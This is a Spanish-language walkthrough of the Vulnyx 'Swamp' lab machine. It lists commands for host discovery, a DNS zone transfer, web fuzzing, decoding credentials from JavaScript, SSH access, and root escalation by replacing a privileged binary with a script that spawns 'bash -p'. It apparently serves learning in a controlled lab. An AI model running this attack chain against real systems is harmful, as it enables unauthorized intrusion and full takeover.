
## 1. Introducción

El presente documento describe **de forma detallada y paso a paso**, incluyendo **comandos y procedimientos**, el proceso seguido para completar la máquina vulnerable **Swamp** de la plataforma Vulnyx. El objetivo del laboratorio es practicar técnicas de **reconocimiento, enumeración, explotación web y escalada de privilegios** en un entorno controlado.

**Entorno utilizado:**

- Sistema atacante: Kali Linux
    
- Sistema objetivo: Swamp (OVA)
    
- Hipervisor: VirtualBox
    
- Red de laboratorio: Solo-anfitrión (`vboxnet0`)
    

---

## 2. Preparación del entorno

### 2.1 Configuración de red

- **Swamp**:
    
    - 1 adaptador de red en modo _Solo-anfitrión_ (`vboxnet0`).
        
- **Kali Linux**:
    
    - Adaptador 1: NAT (acceso a Internet).
        
    - Adaptador 2: Solo-anfitrión (`vboxnet0`).
        

Esta configuración permite a Kali tener salida a Internet y, al mismo tiempo, comunicarse con la máquina vulnerable.

---

## 3. Reconocimiento

### 3.1 Descubrimiento de host

Se identificó la IP de la máquina Swamp dentro de la red de laboratorio:

```bash
sudo nmap -sn 192.168.56.0/24
```

Resultado: se detectó la IP objetivo (ejemplo: `192.168.56.4`).

---

### 3.2 Escaneo de puertos y servicios

Se realizó un escaneo completo de puertos y servicios:

```bash
sudo nmap -sC -sV -p- -T4 192.168.56.4
```

Servicios relevantes detectados:

- HTTP (puerto 80)
    
- DNS (puerto 53)
    
- SSH
    

---

## 4. Enumeración

### 4.1 Enumeración DNS (AXFR)

Se detectó que el servidor DNS permitía **transferencia de zona**:

```bash
dig axfr swamp.nyx @192.168.56.4
```

Esto reveló múltiples subdominios, entre ellos:

- `fiona.swamp.nyx`
    
- `dragon.swamp.nyx`
    
- `duloc.swamp.nyx`
    

---

### 4.2 Configuración de resolución local

Los subdominios no resolvían automáticamente, por lo que se añadieron manualmente al archivo `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

Contenido añadido:

```
192.168.56.4 swamp.nyx
192.168.56.4 fiona.swamp.nyx
```

---

### 4.3 Enumeración Web con navegador y Caido

Se accedió a:

```
http://fiona.swamp.nyx
```

Se utilizó **Caido** para:

- Interceptar peticiones HTTP
    
- Analizar recursos cargados
    
- Inspeccionar respuestas del servidor
    

Durante el análisis se observó la carga de **archivos JavaScript**.

---

### 4.4 Fuzzing de directorios

Se realizó fuzzing para localizar directorios ocultos:

```bash
ffuf -u http://fiona.swamp.nyx/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
```

Resultado relevante:

- Descubrimiento del directorio `/js/`
    

---

### 4.5 Análisis de JavaScript

Se accedió al directorio descubierto:

```
http://fiona.swamp.nyx/js/
```

Se descargó y analizó el archivo JavaScript:

```bash
curl http://fiona.swamp.nyx/js/script.js
```

En el archivo se encontró información ofuscada en formato Base64.

---

### 4.6 Decodificación de credenciales

Se decodificó la cadena encontrada:

```bash
echo "<cadena_base64>" | base64 -d
```

El resultado proporcionó **credenciales válidas** (usuario y contraseña).

---

## 5. Acceso inicial

Con las credenciales obtenidas se accedió a la máquina mediante SSH:

```bash
ssh usuario@192.168.56.4
```

Se obtuvo acceso como usuario sin privilegios.

---

## 6. Escalada de privilegios

### 6.1 Enumeración local

Se enumeraron permisos especiales y binarios SUID:

```bash
find / -perm -4000 2>/dev/null
```

Se identificó el binario:

```
/home/shrek/header_checker
```

Con permisos SUID y ejecución como root.

---

### 6.2 Escalada de privilegios (método utilizado)

El usuario tenía permisos para **borrar y reemplazar** el binario `header_checker`.

#### Paso 1: eliminar el binario original

```bash
rm /home/shrek/header_checker
```

#### Paso 2: crear un nuevo archivo malicioso con el mismo nombre

```bash
echo -e '#!/bin/bash\n/bin/bash -p' > /home/shrek/header_checker
```

#### Paso 3: asignar permisos de ejecución

```bash
chmod +x /home/shrek/header_checker
```

#### Paso 4: ejecutar el binario como root

```bash
sudo /home/shrek/header_checker
```

Esto abrió una **shell privilegiada**.

---

## 7. Verificación de acceso root

```bash
whoami
id
```

Resultado:

```
root
```

Acceso total al sistema conseguido.

---

## 8. Conclusión

La máquina _Swamp_ demuestra vulnerabilidades comunes en entornos reales:

- Mala configuración del servicio DNS.
    
- Exposición de credenciales en JavaScript.
    
- Gestión incorrecta de binarios SUID.
    

El laboratorio refuerza la importancia de:

- Principio de mínimo privilegio.
    
- Auditoría de servicios expuestos.
    
- Protección de recursos web.
    

---

## 9. Consideraciones éticas

Este procedimiento se ha realizado exclusivamente con fines académicos, en un entorno controlado y autorizado.